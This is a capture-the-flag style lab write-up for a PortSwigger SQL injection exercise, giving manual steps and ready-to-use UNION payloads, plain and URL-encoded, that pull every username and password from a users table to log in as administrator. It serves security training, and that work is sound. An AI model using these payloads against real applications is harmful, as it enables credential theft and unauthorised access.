# Lab 6: SQL injection UNION attack, retrieving multiple values in a single column

This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

## Hint
You can find some useful payloads on our [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

## Solution
> Manual
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, only one of which contain text, using a payload like the following in the category parameter: ```'+UNION+SELECT+NULL,'abc'--```
3. Use the following payload to retrieve the contents of the users table: ```'+UNION+SELECT+NULL,username||'~'||password+FROM+users--```
4. Verify that the application's response contains usernames and passwords.

> Scripting the attack: [Script](https://github.com/darshannn10/PortSwiggers-Web-Sec-Academy/blob/main/SQL-Injection/Lab-06/sqli-lab-06.py)

## Payload:
Normal: ``'  UNION SELECT NULL,username ||':'|| password FROM users--```

URL-Encoded: ```%27+UNION+SELECT+NULL,username||%27:%27||password+FROM+users--```

## Video Solution:
1. [Manual](https://youtu.be/yRVYoqR9vrI)
2. [Automating](https://www.youtube.com/watch?v=Hw6tN5K7Uhg&list=PLuyTk2_mYISLaZC4fVqDuW_hOk0dd5rlf&index=7)
